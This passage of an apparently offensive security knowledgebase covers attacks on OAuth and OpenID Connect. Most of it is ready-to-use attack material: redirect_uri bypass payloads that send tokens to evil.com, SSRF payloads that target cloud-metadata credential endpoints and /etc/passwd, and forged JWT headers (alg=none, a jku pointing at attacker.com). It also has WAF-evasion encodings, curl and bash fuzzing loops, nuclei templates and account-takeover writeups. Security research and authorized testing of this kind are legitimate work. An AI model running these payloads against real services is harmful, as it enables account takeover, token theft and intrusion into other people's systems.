https://trusted.com%255c%255c.evil.com
https://trusted.com%2523%2540.evil.com
https://trusted.com%2523%252f.evil.com
https://trusted.com%3f.evil.com
https://trusted.com%23.evil.com
https://trusted.com%40.evil.com
https://trusted.com%09.evil.com
https://trusted.com%0d.evil.com
https://trusted.com%0a.evil.com
https://trusted.com%0d%0a.evil.com
https://trusted.com%20.evil.com
```

### scope Parameter Fuzzing

```
scope=openid%20email%20profile%20admin
scope=openid%20email%20profile%20offline_access
scope=*
scope=admin
scope=root
scope=system
scope=superuser
scope=openid%20email%20profile%20phone%20address
scope=openid%20email%20profile%20https://www.googleapis.com/auth/cloud-platform
```

### response_type Fuzzing

```
response_type=token
response_type=code%20token
response_type=code%20id_token
response_type=token%20id_token
response_type=code%20token%20id_token
response_type=id_token
response_type=none
response_type=
response_type=code%00
```

### grant_type Fuzzing

```
grant_type=authorization_code
grant_type=implicit
grant_type=password
grant_type=client_credentials
grant_type=refresh_token
grant_type=urn:ietf:params:oauth:grant-type:device_code
grant_type=authorization_code%00
grant_type=authorization_code%20refresh_token
```

### client_id Fuzzing

```
client_id=admin
client_id=root
client_id=test
client_id=demo
client_id=1
client_id=0
client_id=-1
client_id=null
client_id=undefined
client_id=..
client_id=../
client_id=..%2f
```

### state Parameter Fuzzing

```
state=
state=null
state=undefined
state=0
state=1
state=true
state=false
state=0000000000000000
state=aaaaaaaaaaaaaaaa
state=1234567890123456
```

---

## Automation Workflows

### Workflow 1: OAuth Endpoint Discovery

```bash
# Find OAuth endpoints
katana -u https://target.com -jc | grep -i "oauth\|authorize\|callback\|openid"

# Check for well-known endpoints
httpx -l targets.txt -path "/.well-known/oauth-authorization-server" -status-code
httpx -l targets.txt -path "/.well-known/openid-configuration" -status-code

# Enumerate OAuth parameters
paramspider -d target.com | grep -i "client_id\|redirect_uri\|response_type\|scope\|state"
```

### Workflow 2: redirect_uri Validation Testing

```bash
# Generate redirect_uri payloads
cat redirect_uri_payloads.txt | while read payload; do
    curl -s "https://target.com/oauth/authorize?client_id=xxx&redirect_uri=$payload&response_type=code" -o /dev/null -w "%{http_code}
"
done

# Automated with nuclei
nuclei -u https://target.com -t oauth-redirect-uri-bypass.yaml
```

### Workflow 3: Token Endpoint Testing

```bash
# Test authorization code reuse
curl -X POST https://target.com/oauth/token   -d "grant_type=authorization_code&code=CODE&client_id=xxx&client_secret=yyy"

# Test scope upgrade
curl -X POST https://target.com/oauth/token   -d "grant_type=authorization_code&code=CODE&scope=openid+email+profile+admin"

# Test PKCE enforcement
curl "https://target.com/oauth/authorize?client_id=xxx&response_type=code&redirect_uri=yyy"
# (should fail without code_challenge if PKCE enforced)
```

### Workflow 4: Dynamic Registration SSRF

```bash
# 1. Check for registration endpoint
curl https://target.com/.well-known/openid-configuration | jq '.registration_endpoint'

# 2. Register client with SSRF payload
curl -X POST https://target.com/reg   -H "Content-Type: application/json"   -d '{"redirect_uris":["https://example.com"],"logo_uri":"https://interactsh-url"}'

# 3. Trigger logo fetch
curl https://target.com/client/CLIENT_ID/logo

# 4. Check interactsh for callback
```

### Workflow 5: ID Token Validation Testing

```bash
# Test alg=none
curl https://target.com/oauth/callback   -H "Authorization: Bearer eyJhbGciOiAibm9uZSIsICJ0eXAiOiAiSldUIn0.eyJzdWIiOiAidmljdGltIn0."

# Test key confusion
curl https://target.com/oauth/callback   -H "Authorization: Bearer eyJhbGciOiAiSFMyNTYiLCAia2lkIjogImxlZ2l0aW1hdGUta2V5In0.eyJzdWIiOiAidmljdGltIn0.SIGNATURE"
```

---

## Recon Methodology

### Phase 1: Identify OAuth Usage

1. **Manual inspection**: Look for "Log in with X" buttons
2. **Proxy traffic**: Intercept login flow, look for `/authorize`, `client_id`, `redirect_uri`
3. **JavaScript analysis**: Search for OAuth SDKs (auth0.js, oidc-client, AppAuth)
4. **URL patterns**: Check for `/oauth`, `/auth`, `/callback`, `/connect`

### Phase 2: Enumerate Endpoints

```
GET /.well-known/oauth-authorization-server
GET /.well-known/openid-configuration
GET /.well-known/webfinger?resource=acct:user@domain.com
GET /oauth/token
GET /oauth/authorize
GET /oauth/register
GET /oauth/userinfo
GET /oauth/jwks
GET /oauth/revoke
GET /oauth/introspect
```

### Phase 3: Analyze Configuration

From discovery endpoints, extract:
- `registration_endpoint` -> dynamic client registration enabled?
- `request_uri_parameter_supported` -> request_uri SSRF possible?
- `grant_types_supported` -> which flows available?
- `response_types_supported` -> hybrid flows?
- `scopes_supported` -> what scopes available?
- `token_endpoint_auth_methods_supported` -> JWT client auth?
- `claims_supported` -> what user data exposed?

### Phase 4: Test Client Application

1. Capture full OAuth flow in proxy
2. Analyze each request/response for:
   - Missing `state` parameter
   - Weak `redirect_uri` validation
   - Token leakage in URL/Referer
   - Improper token validation
   - Scope upgrade possibilities

### Phase 5: Test Authorization Server

1. Test `redirect_uri` validation rigorously
2. Test authorization code reuse
3. Test PKCE enforcement
4. Test dynamic registration (if available)
5. Test `request_uri` SSRF
6. Test ID token validation (alg=none, key confusion)

---

## Nuclei Templates

### Template 1: OAuth SSRF via Dynamic Registration

```yaml
id: oauth-ssrf-dynamic-registration

info:
  name: OAuth SSRF via Dynamic Client Registration
  author: security-researcher
  severity: high
  description: Tests for SSRF via logo_uri in dynamic client registration
  tags: oauth,ssrf,oob

requests:
  - raw:
      - |
        POST /connect/register HTTP/1.1
        Host: {{Hostname}}
        Content-Type: application/json

        {
          "application_type": "web",
          "redirect_uris": ["https://{{interactsh-url}}/callback"],
          "client_name": "{{Hostname}}",
          "logo_uri": "https://{{interactsh-url}}/favicon.ico",
          "subject_type": "pairwise",
          "token_endpoint_auth_method": "client_secret_basic",
          "request_uris": ["https://{{interactsh-url}}"]
        }

    matchers:
      - type: word
        part: interactsh_protocol
        words:
          - "dns"
```

### Template 2: OAuth Missing State Parameter

```yaml
id: oauth-missing-state

info:
  name: OAuth Missing State Parameter
  author: security-researcher
  severity: medium
  description: Detects OAuth authorization requests without state parameter
  tags: oauth,misconfig,csrf

requests:
  - method: GET
    path:
      - "{{BaseURL}}/oauth/authorize?client_id={{client_id}}&redirect_uri={{redirect_uri}}&response_type=code"

    matchers:
      - type: word
        words:
          - "authorize"
          - "consent"
        condition: and

      - type: word
        words:
          - "state="
        negative: true
```

### Template 3: OpenID Configuration Exposure

```yaml
id: openid-config-exposure

info:
  name: OpenID Connect Discovery Endpoint Exposure
  author: security-researcher
  severity: info
  description: Detects exposed OpenID Connect configuration
  tags: oauth,openid,config,exposure

requests:
  - method: GET
    path:
      - "{{BaseURL}}/.well-known/openid-configuration"
      - "{{BaseURL}}/.well-known/oauth-authorization-server"

    matchers:
      - type: word
        words:
          - "issuer"
          - "authorization_endpoint"
        condition: and
```

### Template 4: OAuth redirect_uri Open Redirect

```yaml
id: oauth-open-redirect

info:
  name: OAuth Open Redirect via redirect_uri
  author: security-researcher
  severity: medium
  description: Tests if redirect_uri allows external redirects
  tags: oauth,open-redirect

requests:
  - method: GET
    path:
      - "{{BaseURL}}/oauth/authorize?client_id={{client_id}}&redirect_uri=https://evil.com&response_type=code"

    matchers:
      - type: regex
        regex:
          - "Location: https://evil.com"
        part: header
```

---

## Tools and Scanners

### Essential Tools

| Tool | Purpose | URL |
|------|---------|-----|
| **Burp Suite** | Proxy, repeater, intruder for manual testing | https://portswigger.net/burp |
| **OAuth Hunter** | Automated OAuth misconfiguration scanner | https://github.com/cyberark/oauth-hunter |
| **Nuclei** | Automated vulnerability scanning | https://github.com/projectdiscovery/nuclei |
| **Katana** | Web crawler for endpoint discovery | https://github.com/projectdiscovery/katana |
| **Httpx** | Fast HTTP prober | https://github.com/projectdiscovery/httpx |
| **Paramspider** | Parameter discovery | https://github.com/devanshbatham/ParamSpider |
| **Interactsh** | OOB interaction collector | https://github.com/projectdiscovery/interactsh |
| **JWT_Tool** | JWT manipulation and testing | https://github.com/ticarpi/jwt_tool |
| **OAuth2-Attack-Tool** | Automated OAuth attacks | https://github.com/dincicant/oauth2-attack-tool |

### Burp Suite Extensions

- **HTTP Request Smuggler**: Test for request smuggling in OAuth endpoints
- **Param Miner**: Discover hidden OAuth parameters
- **JWT Editor**: Manipulate JWT tokens
- **AuthMatrix**: Test authorization flows

---

## Advanced Research

### PortSwigger Research: Hidden OAuth Attack Vectors

**Three novel attack classes identified**:

1. **Dynamic Client Registration SSRF**: Second-order SSRF via `logo_uri`, `jwks_uri`, `sector_identifier_uri`, `request_uris`
2. **redirect_uri Session Poisoning**: Race condition in session-stored redirect_uri enabling code/token theft
3. **WebFinger User Enumeration**: OpenID `/.well-known/webfinger` endpoint reveals valid usernames

### OAuth 2.1 Security Improvements

- **PKCE mandatory for all clients**: Eliminates downgrade attacks
- **Implicit grant removed**: No more token-in-fragment vulnerabilities
- **Exact redirect_uri matching**: No wildcards, no prefix matching
- **Refresh token rotation**: Prevents replay
- **Sender-constrained tokens**: mTLS/DPoP instead of bearer tokens

### Browser-Powered Desync Attacks

Research by PortSwigger on using browser behaviors to cause request smuggling:
- Chrome's handling of chunked encoding
- Safari's connection pooling quirks
- Firefox's header normalization differences

### Web Cache Entanglement

Cache poisoning specifically targeting OAuth callbacks:
- CDN cache key confusion with OAuth parameters
- Cache deception via path normalization

---

## Bug Bounty Writeups

### Writeup 1: OAuth Account Takeover via Email Enumeration

**Researcher**: payatu.com team
**Target**: OAuth-enabled application
**Technique**:
1. Found endpoint `/check/?email={email}` disclosing OAuth status
2. Enumerated 100+ valid emails using Burp Intruder + SecLists
3. Exploited implicit flow to access all enumerated accounts
**Impact**: Mass account takeover including admins

### Writeup 2: Breaking the Chain — OAuth + Forgot Password

**Researcher**: Bugcrowd (Ekoparty 2024)
**Target**: www.vulnerable.com
**Technique**:
1. Linked OAuth account to victim.com
2. Changed email on victim.com to victim's real email
3. Triggered password reset -> link sent to victim's email
4. Reset password -> full account takeover
**Key insight**: OAuth linkage doesn't verify email ownership on the client side

### Writeup 3: OAuth Redirect URI Parser Confusion

**Researcher**: blog.voorivex.team
**Target**: Fully secured OAuth implementation
**Technique**:
1. Standard bypasses all blocked
2. Discovered double-decoding discrepancy: validation decodes once, redirect decodes twice
3. `%2523` (double-encoded #) passed validation as `%23`, became `#` during redirect
4. Changed URL structure completely: `trusted.com/callback%23@evil.com`
**Key insight**: "Fully secured" != "impossible to bypass" — parser differential is the key

---

## Payload Collections

### Complete redirect_uri Bypass Payloads

```
# Basic bypasses
https://evil.com
https://evil.com/callback
http://evil.com

# Subdomain abuse
https://trusted.com.evil.com
https://evil.trusted.com
https://trusted.com@evil.com

# Encoding bypasses
https://trusted.com%00.evil.com
https://trusted.com%0d%0a.evil.com
https://trusted.com%2523.evil.com
https://trusted.com%252f.evil.com

# Path traversal
https://trusted.com/callback/../evil
https://trusted.com/callback/%2e%2e%2fevil

# Query/fragment injection
https://trusted.com/callback?@evil.com
https://trusted.com/callback#@evil.com
https://trusted.com/callback?next=https://evil.com

# localhost bypass
http://localhost.evil.com
http://127.0.0.1.evil.com

# IDN homograph
https://trusted-аpp.com (Cyrillic а)

# Scheme confusion
javascript://trusted.com/%0aalert(1)
data:text/html,<script>alert(1)</script>

# IPv4 embedding
http://0x7f000001
http://0177.0.0.1
http://2130706433
http://[::ffff:127.0.0.1]
```

### Complete SSRF Payloads for OAuth

```
# Cloud metadata
http://169.254.169.254/latest/meta-data/
http://169.254.169.254/latest/meta-data/iam/security-credentials/
http://169.254.169.254/latest/user-data
http://metadata.google.internal/computeMetadata/v1/
http://100.100.100.200/latest/meta-data/ (Alibaba)

# Internal services
http://localhost:8080/
http://127.0.0.1:3000/
http://0.0.0.0:22/
http://[::1]:80/

# Protocol smuggling
gopher://localhost:3306/_%0a...
dict://localhost:11211/
file:///etc/passwd
```

### Complete JWT/ID Token Manipulation Payloads

```
# alg=none
{"alg": "none", "typ": "JWT"}
{"alg": "None", "typ": "JWT"}
{"alg": "NONE", "typ": "JWT"}
{"alg": "nOnE", "typ": "JWT"}

# Algorithm confusion
{"alg": "HS256", "typ": "JWT", "kid": "rsa-key-id"}
{"alg": "RS256", "typ": "JWT", "jku": "https://attacker.com/keys.jwks"}

# Key ID manipulation
{"alg": "RS256", "kid": "../../../etc/passwd"}
{"alg": "RS256", "kid": "null"}
{"alg": "RS256", "kid": "0"}
```

---

## WAF Bypasses

### WAF Evasion for redirect_uri

```
# Case variation
ReDiReCt_UrI=https://evil.com
redirect_uri[]=https://evil.com

# Encoding layers
redirect_uri=%68%74%74%70%73%3a%2f%2f%65%76%69%6c%2e%63%6f%6d
redirect_uri=%2568%2574%2574%2570%2573%253a%252f%252f%2565%2576%2569%256c%252e%2563%256f%256d

# Comment injection
redirect_uri=https://trusted.com/*evil.com
redirect_uri=https://trusted.com<!--evil.com-->

# Unicode normalization
redirect_uri=https://trusted.com/＃evil.com
```

### WAF Evasion for OAuth Parameters

```
# Parameter pollution
?client_id=legitimate&client_id=malicious
?scope=openid&scope=admin
?response_type=code&response_type=token

# JSON parameter wrapping
{"redirect_uri": "https://evil.com"}
[{"redirect_uri": "https://evil.com"}]

# XML parameter wrapping
<?xml version="1.0"?>
<oauth>
  <redirect_uri>https://evil.com</redirect_uri>
</oauth>
```

---

## Detection Techniques

### Detecting OAuth in JavaScript

```javascript
// Search for OAuth patterns in JS
/oauth|authorize|client_id|redirect_uri|access_token|id_token/.test(scriptContent)

// Detect OAuth SDKs
/auth0|oidc-client|AppAuth|hello.js|passport/.test(scriptContent)
```

### Detecting Token Leakage

```bash
# Check Referer headers
grep -i "referer:.*access_token\|referer:.*code=" access.log

# Check browser history for tokens
sqlite3 History "SELECT url FROM urls WHERE url LIKE '%access_token%' OR url LIKE '%code=%'"
```

### Detecting Missing State

```python
# Python check for state parameter
import re

def check_state_param(url):
    if 'state=' not in url and ('authorize' in url or 'auth' in url):
        return "MISSING_STATE"
    return "OK"
```

### Detecting Weak redirect_uri Validation

```bash
# Automated test script
#!/bin/bash
TARGET="https://victim.com/oauth/authorize"
CLIENT_ID="xxx"

PAYLOADS=(
    "https://evil.com"
    "https://victim.com.evil.com"
    "https://victim.com@evil.com"
    "https://victim.com%00.evil.com"
)

for payload in "${PAYLOADS[@]}"; do
    response=$(curl -s -o /dev/null -w "%{http_code},%{redirect_url}"         "$TARGET?client_id=$CLIENT_ID&redirect_uri=$payload&response_type=code")
    echo "Payload: $payload -> $response"
done
```

---

## References

### Official Specifications

- [RFC 6749 — OAuth 2.0 Authorization Framework](https://tools.ietf.org/html/rfc6749)
- [RFC 6750 — Bearer Token Usage](https://tools.ietf.org/html/rfc6750)
- [RFC 7636 — Proof Key for Code Exchange (PKCE)](https://tools.ietf.org/html/rfc7636)
- [RFC 8252 — OAuth 2.0 for Native Apps](https://tools.ietf.org/html/rfc8252)
- [OpenID Connect Core 1.0](https://openid.net/specs/openid-connect-core-1_0.html)
- [RFC 7591 — Dynamic Client Registration](https://tools.ietf.org/html/rfc7591)
- [RFC 7592 — Dynamic Client Registration Management](https://tools.ietf.org/html/rfc7592)
- [OAuth 2.0 Security Best Current Practice](https://tools.ietf.org/html/draft-ietf-oauth-security-topics)

### Research Papers

- [Hidden OAuth Attack Vectors — PortSwigger Research](https://portswigger.net/research/hidden-oauth-attack-vectors)
- [Make Redirection Evil Again: URL Parser Issues in OAuth](https://i.blackhat.com/asia-19/Fri-March-29/bh-asia-Wang-Make-Redirection-Evil-Again-wp.pdf)
- [Security Analysis of Real-Life OpenID Connect](https://www.nds.rub.de/media/ei/arbeiten/2021/05/03/masterthesis.pdf)
- [More Guidelines Than Rules: CSRF Vulnerabilities from Noncompliant OAuth 2.0 Implementations](https://www.usenix.org/conference/usenixsecurity20/presentation/wang)

### Bug Bounty Writeups

- [All your Paypal OAuth tokens belong to me — asanso](https://blog.detectify.com/2016/11/17/all-your-paypal-tokens-belong-to-me/)
- [OAuth 2 — How I have hacked Facebook again — asanso](https://blog.detectify.com/2014/04/03/oauth-2-how-i-have-hacked-facebook-again/)
- [How I hacked Github again — Egor Homakov](https://homakov.blogspot.com/2014/02/how-i-hacked-github-again.html)
- [How Microsoft is giving your data to Facebook — Andris Atteka](https://andrisatteka.blogspot.com/2014/09/how-microsoft-is-giving-your-data-to.html)
- [Bypassing Google Authentication on Periscope — Jack Whitton](https://whitton.io/articles/bypassing-google-authentication-on-periscopes-admin-panel/)
- [Breaking the Chain: Exploiting OAuth and forgot password — Bugcrowd](https://www.bugcrowd.com/blog/breaking-the-chain-exploiting-oauth-and-forgot-password-for-account-takeover/)

### Tools & Resources

- [PayloadsAllTheThings — OAuth](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/OAuth%20Misconfiguration)
- [HackTricks — OAuth to Account Takeover](https://book.hacktricks.wiki/en/pentesting-web/oauth-to-account-takeover.html)
- [OAuth 2.0 Security Cheat Sheet — Koen Buyens](https://github.com/koenbuyens/oauth-2.0-security-cheat-sheet)
- [Nuclei Templates — OAuth](https://github.com/projectdiscovery/nuclei-templates/tree/main/http/vulnerabilities/oauth)
- [PortSwigger Web Security Academy — OAuth](https://portswigger.net/web-security/oauth)
- [PortSwigger Web Security Academy — OpenID Connect](https://portswigger.net/web-security/oauth/openid-connect)
- [OAuth.net](https://oauth.net/2/)
- [MDN — Web Security/OAuth](https://developer.mozilla.org/en-US/docs/Web/Security/OAuth)

---

> **Disclaimer**: This knowledgebase is for authorized security testing and bug bounty hunting only. Always ensure you have explicit permission before testing any target. The techniques described here can cause serious security incidents if used maliciously.

> **Last Updated**: 2026-05-24
> 
> **Contributions welcome**: If you discover new OAuth attack vectors, please contribute to the community resources listed above.
